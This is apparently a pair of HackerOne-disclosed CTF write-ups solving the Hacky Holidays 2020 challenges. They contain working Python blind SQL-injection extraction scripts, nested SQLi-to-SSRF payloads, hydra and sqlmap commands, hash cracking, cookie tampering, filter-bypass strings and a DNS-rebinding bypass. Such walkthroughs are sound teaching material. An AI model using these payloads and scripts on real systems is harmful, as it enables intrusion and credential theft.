This how we were able to achieve an SSRF to hit the `/api` endpoints. I *just* needed an SQLi inside another SQLi inside another SQLi inside another S....😓

The next steps consist of discovering what endpoint we could hit and the right parameters to use. Once that was out of the way, it was time to enumerate a valid user by sending requests to the `/api/user` endpoint. The tricky part and I have to shoutout @mcipekci for pointing me in the right direction, was using the `%` character in an SQL `LIKE` statement. This allows recursive queries to be made to enumerate our user. 

This is the resulting script:

```python
import requests
import re
from string import printable

base_username=''
base_password=''

def search_username(username):
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        r=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=\' UNION SELECT "\' UNION SELECT \'null.jpg\',null,\'../api/user?username={}{}%\'-- -",null,1-- -'.format(username,c))
        regex=re.search('data=.*\"', r.text)
        data_param=regex.group(0)
        data_param = data_param[:-1]
        r2=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?{}'.format(data_param))
        
        if r2.text.find("Invalid content type detected") != -1:
            username += c
            print("new char found: " +username)
            search_username(username)

def search_password(password):
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        r=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=\' UNION SELECT "\' UNION SELECT \'null.jpg\',null,\'../api/user?password={}{}%\'-- -",null,1-- -'.format(password,c))
        regex=re.search('data=.*\"', r.text)
        data_param=regex.group(0)
        data_param = data_param[:-1]
        r2=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?{}'.format(data_param))
        
        if r2.text.find("Invalid content type detected") != -1:
            password += c
            print("new char found: " +password)
            search_password(password)

#search_username(base_username)
search_password(base_password)
```
The credentials returned are _grinchadmin:s4nt4sucks_

We can now login into the attack-box, get the flag number 11 and move on to the 12th and last(ish) challenge.

`flag{07a03135-9778-4dee-a83c-7ec330728e72}`

Flag12 - Attack Box
---------------------
My body and my spirit were put under unimaginable pressure after flag11. Nothing could faze me any longer. I think this what it feels like to reach nirvana. A completely different and better perspective on life was provided to me, so without further ado, let's bring this adventure to an end.

{F1140046}

The Grinch is planning to take down Santa's servers and our goal is to plan a counterattack by taking him down instead. Honestly, it was like a walk in the park (it actually wasn't but it fits the narrative so Imma just run with it). Between a chess match with Buddah and a poker session with a couple of greek gods (I told you I was on a whole different level at this point no?) I was able to inspect the HTTP request responsible for starting a DDoS attack.

```http
GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687
```

It was time to crack the hash to get a hold of the situation. As confirmed by H1 it was indeed a salted hash. I came to the (pretty obvious) conclusion that the target IP was the variable and I tried to  crack the salt using `hashcat`

{F1140048}

Success! We now know the hash is a salted md5($pass.$salt) → [ip].mrgrinch463.
We can now craft whatever payload we want, thus being able to choose the target IP to attack. I quickly tried to use `localhost` in all its shapes and forms but there was an SSRF protection to bypass.
After trying every possible encoding (hex,octa,binary you name it) I stumbled across a common technique known as [DNS rebind](https://en.wikipedia.org/wiki/DNS_rebinding) and an amazing tool [rbndr](https://github.com/taviso/rbndr).
In hindsight, the hint was always there. The fake command-line messages appeared in succession and a better eye would have spotted the vulnerability right away. We basically exploit the fact that the remote host lookup and then the actual attack occur in two separate time frames. This is ideal for [TOCTOU attacks](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use). 

I finally got a working payload that looks like this: 
```javascript
{"target":"cb007121.7f000001.rbndr.us","hash":"aa9c061c933f709acb4d69329bc7b1af"}
```
The host lookup is not gonna fail since that domain instantly resolved to a valid public IP (I used one of Santa's, hope he doesn't mind) but a short TTL allows it to resolve to `127.0.0.1` shortly after.

The grinch is defeated as the page we're redirected to show us.

{F1140049}

I can now go back to finishing my discussion with Gandhi and Muhammad Ali, I left them hanging. Peace✌️

`flag{07a03135-9778-4dee-a83c-7ec330728e72}`

Flag9 - Evil Quiz
---------------------
I hate giving this challenge attention but here we go. I say that because for the longest time I thought it was a time-based blind SQLi using the `name` param. So yeah I'm pissed at myself for being slow and wasting a lot of time on it (the server was slow too at times so can we have a 50/50?). Having solved flag11 before flag9 allowed me to pretty much speedrun through this one though. The idea here is very similar and all I had to do was change the script from flag11 and craft a new payload for what I now know is a **BOOLEAN-BASED BLIND SQLi**.  Here it is:

```python
import requests
import re
from string import printable

base_username=''
base_password='s3cret\_p4ssw0rd-'

headers= { "Content-Type" : "application/x-www-form-urlencoded" }
cookies= { "session" : "fa3c1dba251b1de924de64d2322c446f" }

def search_username(username):    
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        post_data = { "name" : "admin' and EXISTS (SELECT * FROM admin WHERE username LIKE '{}{}%') -- -".format(username,c) } 
        r=requests.post('https://hackyholidays.h1ctf.com/evil-quiz', data = post_data, headers=headers, cookies=cookies)
        r2=requests.get('https://hackyholidays.h1ctf.com/evil-quiz/score', cookies=cookies)
        if r2.text.find("is 0 other player(s)") == -1:
            username += c
            print("new char found: " +username)
            search_username(username)

def search_password(password):
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        post_data = { "name" : "admin' and EXISTS (SELECT * FROM admin WHERE username LIKE 'admin' and password LIKE '{}{}%') -- -".format(password,c) } 
        r=requests.post('https://hackyholidays.h1ctf.com/evil-quiz', data = post_data, headers=headers, cookies=cookies)
        r2=requests.get('https://hackyholidays.h1ctf.com/evil-quiz/score', cookies=cookies)
        if r2.text.find("is 0 other player(s)") == -1:
            password += c
            print("new char found: " +password)
            search_password(password)
        
        

search_username(base_username)
search_password(base_password)
```
Credentials: _admin:S3creT_p4ssw0rd-$_
Flag is secured! Quick side note: I learned that using `LIKE BINARY  'strin%'` statements allows you to have a case sensitive query (crucial for this challenge)

` flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`


Prologue
---------------------
What can I say, what I thought was going to be another normal CTF event turned out to be much much more.
The Grinch is out and I evolved. It's a win-win in my books
Every story has an end and this is it. Here's a closing selfie I took right before writing this report/story/novel. Hope you enjoy it (I'm the one in the middle if it wasn't clear)

*Legal disclaimer: my lawyer wanted me to say this.*
 *No drugs or any other illegal substances were used in the process of writing this report (or in any other moment per say)*

{F1140052}



On a serious note though,
I had a blast and thanks to Adam, @nahamsec, and everyone else involved for making this. Shoutout also to my partner in crime @cranelab.
Hope you all had a good laugh reading this and I wish you all the best.

I'm out,
@thezoomer

## Impact

Depending on what side you're on, impact may vary. Use with caution.

---

### [Wholesome Hacky Holidays: A Writeup](https://hackerone.com/reports/1066135)

- **Report ID:** `1066135`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @0x0d0
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T18:00:46.139Z
- **CVE(s):** -

**Vulnerability Information:**

## Flag 1 Warm-up: flag{48104912-28b0-494a-9995-a203d1e261e7}
Checking the `robots.txt` the flag can be found. Also a path is revealed: `/s3cr3t-ar3a`

## Flag 2 It's right in front of you: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
With the previously found path `/s3cr3t-ar3a`, the flag was hidden in plain sight. Opening the dev tools and searching for `flag` reveals it.

## Flag 3 People Rater: flag{b705fb11-fb55-442f-847f-0931be82ed9a}
On the front page a new button `Apps` appeared. One app, the `People Rater` is aviailable. At URL `https://hackyholidays.h1ctf.com/people-rater` we can use the Grinch People Rater by clicking one of the names. For example selecting `Tea Avery` pops an alertbox with `Awful`. Looking at the request in Burp:

Request:
```
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://hackyholidays.h1ctf.com/people-rater
``` 

Response: 
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Dec 2020 03:47:29 GMT
Content-Type: application/json
Connection: close
Content-Length: 57

{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```

In the request, we see the parameter `id=eyJpZCI6Mn0=` which is an encoded base64 string. Decoding it reveals `{"id":2}`. Simply replacing the value with the base64 encoded variant of `{"id":2}`, which is `eyJpZCI6MX0=` leads to the following response:
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Dec 2020 03:51:22 GMT
Content-Type: application/json
Connection: close
Content-Length: 135

{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```
## Flag 4 Swag Shop: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
The objective of this challenge is to pull the Grinch's details from the online shop. We are presented with an online shop that has an API. We can fuzz the API and find the following two hidden endpoints:
```
/swag-shop/api/sessions
/swag-shop/api/user
```
The first endpoint reveals 7 different base64-encoded session tokens. One of the tokens is longer than the others. Decoding it reveals:
```
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```
Here, we have a Universal Unique Identifier (UUID) and a cookie. 
Taken a look at the `/swag-shop/api/user` endpoint results in:
```
error	"Missing required fields"
```
So here, we are searching for a parameter. By manual testing with the information that we already collected we can identify uuid as a parameter. Requesting `/swag-shop/api/user?uuid=1` responds with: 
```
error	"Could not find matching uuid"
```
Simply appending the UUID to the URI we found previously and accessing 
`https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043` we can pull the Grinch's details and a flag.
```	
uuid	"C7DCCE-0E0DAB-B20226-FC92EA-1B9043"
username	"grinch"
address	
line_1	"The Grinch"
line_2	"The Cave"
line_3	"Mount Crumpit"
line_4	"Whoville"
flag	"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
```

## Flag 5 Secure Login: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
The objective of this challenge is to find a way past the login page to get to the secret area. The challenge starts with a login page. Testing a random combination for the username and password field, an `Invalid Username` appears. This is an indicator, that we might be able to brute-force the username and password individually based on the error code. We first try to brute-force the username with: 
```
hydra -L ~/SecLists/Usernames/Names/names.txt -p pass hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Username"
```
We receive the username:`access`. Given the username, trying a random password leads to the error response `Invalid Password`. We can brute-force the password using: 
```
hydra -l access -P ~/wordlists/rockyou.txt hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Password"
```
We receive the password: `computer`. Logging in with the brute-forced credentials we land at a page with secure files where are `No Files To Download`. Investigating the response in Burp, we can notice the Cookie:
```
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D
```
Doing a base64-decoding on the cookie shows:
```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}7
```
We change the cookie to:
```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}
```
and encode it with base64 again:
```
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```
With this we can see one file named `my_secure_files_not_for_you.zip`, which we can download locally (`wget https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip`). Trying to unzip the file, a password is requested. We can crack this with john the ripper.
```
zip2john my_secure_files_not_for_you.zip > my_secure_files_not_for_you.txt
john my_secure_files_not_for_you.txt
```
John the ripper cracks the password, which is `hahahaha`. With the password, we can unzip the archive and retrieve the flag.

## Flag 6 My Diary: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
The objective of this challenge is to hack the Grinch's diary to find out about his upcoming event. Starting the challenge, we can directly recognize the path `my-diary/?template=entries.html`. It seems that the `entries.html` is included through the `template` parameter. It might also be possible to include other pages then. Through a bit of manual testing for some common pages, we can find `/template=index.php`, which presents the respective php code. 
```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```
Visiting the endpoint `secretadmin.php` we see the message `You cannot view this page from your IP Address`. After trying a few bypasses, it becomes clear that this seems to be a dead end. Taking a closer look at our previously found `index.php` we can see that the code does three things. 
 1. Special characters are eliminated
 2. The string `admin.php` is eliminated
 3. The string `secretadmin.php` is eliminated. 
To include `secretadmin.php` we need to bypass these restrictions. This can be achieved through the following parameter `ssecretaadmin.phpdmin.phpecretaadmin.phpdmin.php`. This will include the `secretadmin.php` file and we can retrieve the flag and see that the Grinch plans to `Launch DDoS Against Santa's Workshop!` on `23rd Dec`.

## Flag 7 Hate Mail Generator: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
In this challenge, we are asked to find the flag in the Grinch's hate mail generator. Clicking through the app, we find that the grinch uses templates:
```
{{template:cbdj3_grinch_header.html}} 
Hi {{name}}..... 
Guess what..... 
<strong>YOU SUCK!</strong>
{{template:cbdj3_grinch_footer.html}}
```
From here we can see that we can include `{{name}}` as well as two templates. It is also possible to create a new mail for testing. If we try to include a wrong path with `{{template:chron0x}}` we get the response `Cannot find template file /templates/chron0x`. Checking the path `/hate-mail-generator/templates/` we find that there exists another template: `38dhs_admins_only_header.html`. However, including it in the markup results in the message: `You do not have access to the file 38dhs_admins_only_header.html`. On the other side including it in the Subject or Name field does not lead to such an error. Previously we also have seen, that it is possible to include `{{name}}`. Investigating the request in Burp, we can see that `preview_data` is used as a body parameter. URL decoding the parameter results in:
```
{"name":"Alice","email":"alice@test.com"}
```
Here we can manipulate the name parameter to `{"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}` and URL-encode it again. Providing the manipulated `preview_data` body parameter with `{{name}}` in the markup field we can access the `Grinch Network Admins Only` area and find the flag. The manipulated body looks like this:
```
preview_markup=%7B%7Bname%7D%7D&preview_data=%7B%22name%22%3A%22%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D%22%2C%22email%22%3A%22alice%40test.com%22%7D
```

## Flag 8 Forum: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
The objective of this challenge is to access the admin space of the Grinch's forum. In the forum, we can identify the username `grinch` and `max`. Brute-forcing for passwords with these usernames does not give any result. A directory brute-force reveals the path `/forum/phpmyadmin`. Here, brute-forcing does also not lead to any further results. After further searches for Grinch-Networks on Google and Github, the source code of the forum could be discovered at `https://github.com/Grinch-Networks/forum`. Looking at the commits, the credentials for the phpmyadmin can be discovered in the ["Small fix" commit](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae). The credentials are `forum:6HgeAZ0qC9T6CQIqJpD`. Clicking through the pages we can discover MD5-hashed passwords for the grinch and max at `/forum/phpmyadmin?db=forum&table=user`. [Crackstation](https://crackstation.net/) can crack the password of the grinch. 
```
grinch  35D652126CA1706B59DB02C93E0C9FBF    md5     BahHumbug
max     388E015BC43980947FCE0E5DB16481D1    Unknown Not found.
```
Logging in with `grinch:BahHumbug` at `/forum/login` we can access the `Secret Plans` blogpost which further details the Grinch's DDoS attack plans as well as the flag.

## FLag 9 Evil Quiz: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
In this challenge, we are participating in a quiz by the grinch. After poking around at the page we notice that the `name` field/parameter is vulnerable to SQL injection. Injecting `' or (select sleep(15)); --` as the name and navigating to `/evil-quiz/score` puts the site to sleep for 15 seconds. From this, we know that we might deal here with a second-order time-based blind SQL injection. So lets fire up `sqlmap`:
```
sqlmap -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=4e78bb0ffd17d4f1f67799a8d4165394" -D quiz --dump
```
Sqlmap finally reveals the credentials: `admin:S3creT_p4ssw0rd-$`. With these, we can log in to the admin panel (`/evil-quiz/admin`) and retrieve the flag.

## Flag 10 Signup Manager: flag{99309f0f-1752-44a5-af1e-a03e4150757d}
At the beginning of the challenge, we are presented with a login forum. After an attempt to create an account we are stuck with the message `We'll have a look into you and see if you're evil enough to join the grinch army!` with only the option to log out. Inspecting the source of the login page, we can see a reference to `README.md` in a comment at the top. Navigating to `/signup-manager/README.md` automatically downloads the markdown file. The content is as follows:
```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```
We can notice the reference to `signupmanager.zip`. Navigating to `/signup-manager/signupmanager.zip` downloads a zip file containing the source code of the application. Of the source code, only the `index.php` file is relevant for this challenge. In a nutshell, the code takes the username, password, age, first name, and last name as inputs, substitutes special characters, checks that their length is below a certain length, and pads them if necessary. The inputs are concatenated with a random md5 hash in between. Most importantly, the code appends the character `N` at the end of the string, to flag this user as non-root. The `README.md`, as well as the source code, reveal that access to the admin page is granted when the character `Y` is appended instead. Hence, the objective is to inject a `Y` at the end of our string through the last name parameter. Therefore the string has to be extended.
Of special interest for this challenge is the handling of the age-parameter:
```php
[...]
if (!is_numeric($_POST["age"])) {
    $errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
    $errors[] = 'Age entered is too long';
}
[...]
```
In short, the age parameter has to be numeric and less than 3 characters. At first thought, this might only allow a maximum age of 999. However, php also allows the scientific notation with the `e` character. For example `1e4` will be translated to `10000`. As we can see `1ex` fulfills our conditions: It is numeric, fewer characters than 3, and will extend our string.
With this knowledge we can register a new user and change the payload as follows:
```
action=signup&username=pink&password=panther&age=1e3&firstname=pink&lastname=pantherYYYYYYYY
```
This will forward us to the admin area and present the flag.

## Flag 11 SQL Inception: flag{07a03135-9778-4dee-a83c-7ec330728e72}
Apart from the flag, challenge 10 also presented a link: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59`, which is the starting point of this challenge. Be prepared for some brain toasting from here on. Browsing through the app we find that there are three albums which are requested via a hash, such as `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k`. Each album requests several images, for example like `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9`. Decoding the data value with base64 reveals: 
```
{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"}
```
Further, there is an endpoint `/r3c0n_server_4fdk59/api` which states 
```
+------------------+----------------------------------------------+
| HTTP Status Code |                 Explanation                  |
+------------------+----------------------------------------------+
| 200              | Successful request with data returned        |
| 204              | Successful request but with no data found    |
| 404              | Invalid Endpoint                             |
| 400              | Invalid GET/POST variable                    |
| 401              | Unauthenticated Request or Invalid client IP |
+------------------+----------------------------------------------+
```
After a bit of tinkering with the app, we find that the `hash` parameter in album is vulnerable against SQL injection. 
```
$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dbs --dump

---
Parameter: hash (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: hash=jdh34k' AND 6610=6610 AND 'Fhnh'='Fhnh

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: hash=-2048' UNION ALL SELECT NULL,NULL,CONCAT(0x7178707a71,0x75596543734d797a5042444f5869494d5858675873624c52677a554a654f507072446f5078754469,0x7162627171)-- -
---
[11:09:20] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 8
[11:09:20] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] recon

Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+

Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```
The requests to this database might look something like this: 
```SQL
select photo from album, photo where album.id = photo.album_id and hash = <input>
```
From the sqlmap output, we already know a payload: `chron0x' UNION ALL SELECT NULL,NULL,"chron0x"-- -`. This will print `chron0x` on a page. At that time a lot of people including me were stuck and in the forum, several hints regarding the movie "Inception" were dropped. It turned out that these referred to an SQL injection in the SQL injection. Following these hints and with a bit of tinkering, we can find another SQL injection in the SQL Injection.
```
chron0x' UNION ALL SELECT "chron0x' UNION ALL SELECT NULL,NULL,'chron0x_path'-- -",null,null -- -
```
Using this payload, the response to `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=hash=chron0x%27%20UNION%20ALL%20SELECT%20%22chron0x%27%20UNION%20ALL%20SELECT%20NULL,NULL,%27chron0x_path%27--%20-%22,null,null%20--%20-`, will try to fetch an image with the following: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2Nocm9uMHhfcGF0aCIsImF1dGgiOiJmOTNjMzI5MjI5OTU0ZWQzOWRmYTRhMzkwMTNmNjljNSJ9`. Decoding the base64 payload, we can see that `chron0x_path` is reflected 
```
{"image":"r3c0n_server_4fdk59\/uploads\/chron0x_path","auth":"f93c329229954ed39dfa4a39013f69c5"}
```
The response of the request to fetch this image is `Expected HTTP status 200, Received: 404`. Now that we found the inception SQLi, lets write a small script to explore what we just did manually a bit more.
```
#!/bin/bash

URL="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/"

BASE64=$(curl -s $URL"album?hash=chron0x' UNION ALL SELECT \"chron0x' UNION ALL SELECT NULL,NULL,'$1'-- -\",null,null -- -" \
        | grep "img-responsive" \
        | grep -o "data\=.*" \
        | sed "s/^data\=//g" \
        | sed "s/\">//g")

RESP=$(curl -s $URL"picture?data="$BASE64)

echo $1 $RESP
```
The script will always respond with our input parameter and the response with respect to the picture query. Through either brute-forcing or some educated guesses we can find the following interesting responses.
```
chron0x Expected HTTP status 200, Received: 404
../api Invalid content type detected
../api/user Invalid content type detected
```
Note you can use the above script for brute-forcing by just queying it with each line of the wordlist and grepping for the reponses. Now we know that the user endpoint exists. The next step would be to query some user information. Through an educated guess or brute-forcing we can again find a valid parameter.
```
../api/user?name=chron0x Expected HTTP status 200, Received: 400
../api/user?username=chron0x Expected HTTP status 200, Received: 204
```
As we have seen from the previous table, response `204` means `Successful request but with no data found`. This means we found the `username` parameter. The next step would be to find a valid username. First, let's see if any character can give us a different response. Iterating through all ASCII characters we find:
```
../api/user?username=a Expected HTTP status 200, Received: 204
../api/user?username=b Expected HTTP status 200, Received: 204
../api/user?username=% Invalid content type detected
```
In hope that the `%` character behaves as a wildcard, we can try if we can brute-force the first character of a username. Indeed, we can the following username:
```
../api/user?username=g% Invalid content type detected
../api/user?username=gr% Invalid content type detected
../api/user?username=gri% Invalid content type detected
../api/user?username=grin% Invalid content type detected
../api/user?username=grinc% Invalid content type detected
../api/user?username=grinch% Invalid content type detected
../api/user?username=grincha% Invalid content type detected
../api/user?username=grinchad% Invalid content type detected
../api/user?username=grinchadm% Invalid content type detected
../api/user?username=grinchadmi% Invalid content type detected
../api/user?username=grinchadmin% Invalid content type detected
../api/user?username=grinchadmin Invalid content type detected
```
`grinchadmin` it is. Well, we already found a method to brute-force the username. Let's try if we can apply the same approach for a password. However, at this step, we have to be cautious, since we do not know how to connect the two parameters.
```
../api/user?username=grinchadmin&test=chron0x Invalid data format
../api/user?username=grinchadmin%26test=chron0x Expected HTTP status 200, Received: 400
```
As we can see, we should use the URL-encoded variant. Again through either an educated guess or through brute-force, we can find the password parameter.
```
../api/user?username=grinchadmin%26pass=chron0x Expected HTTP status 200, Received: 400
../api/user?username=grinchadmin%26password=chron0x Expected HTTP status 200, Received: 204
```
With the same procedure as before, we can brute-force the password.
```
../api/user?username=grinchadmin%26password=% Invalid content type detected
../api/user?username=grinchadmin%26password=s% Invalid content type detected
../api/user?username=grinchadmin%26password=s4% Invalid content type detected
../api/user?username=grinchadmin%26password=s4n% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4s% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4su% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4suc% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4suck% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4sucks% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4sucks Invalid content type detected
```
We successfully brute-forced the credentials: `grinchadmin:s4nt4sucks`. To get the flag and to the next challenge, we can use the credentials to log in into the attack-box (`/attack-box`).

# Flag 12 Attack Box: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
At this stage, we are logged into the Grinch's attack server. From here we can start a DDOS attack at three of Santas' servers. The objective of this challenge is to reroute this DDOS attack toward the Grinch's server, in other words to localhost. Launching an attack against any of the servers, the following request is send: `/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==`. Decoding the base64 reveals: `{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}`. For all three servers, this results in:
```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}
{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
```
The `hash` parameter appears to be an MD5-hash. Tinkering with either the `target` or `hash` parameter results in the response: `Invalid Protection Hash`. This tells us that some sort of validation of the target and hash parameter is performed. Since the target does not directly translate to the hash, we can guess that it is a salted hash. We can try to crack the hash with hashcat. Therefore, we store our information in the form `$pass:$salt` into a file called `hash.txt`:
```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
2814f9c7311a82f1b822585039f62607:203.0.113.53
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
```
Now we can proceed to try to crack the hashes with 
```
hashcat -m10 -O -o hash.out hash.txt /usr/share/wordlists/rockyou.txt
```
Here `-m10` stands for our selected format, as to how we stored the hashes in our file. After executing this we can view the outputs in the file `hash.out`:
```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
2814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
```
We successfully cracked the hashes and are now able to generate our payloads. As a quick sanity check we can confirm that the MD5 of `mrgrinch463203.0.113.33` is indeed `5f2940d65ca4140cc18d0878bc398955`. So lets redirect the attack against `127.0.0.1` with the following payload `{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}`, with `3e3f8df1658372edf0214e202acb460b` being the MD5 for `mrgrinch463127.0.0.1`. Launching the attack with `/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==` and visiting `https://hackyholidays.h1ctf.com/attack-box/launch/5867c35a78d569fea1d4ac81ae55e2e1`, we can see that:`Local target detected, aborting attack`. This means there is a detection in place, such that we do not attack ourselves. It would be great if we first could pretend that we are the target IP and then switch to the localhost. We can achieve exactly this with a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding). I used the following [service](https://lock.cmpxchg8b.com/rebinder.html). What it does is: "The hostname generated will resolve randomly to one of the addresses specified with a very low time to live record." We insert our two IP addresses of choice `203.0.113.33` and 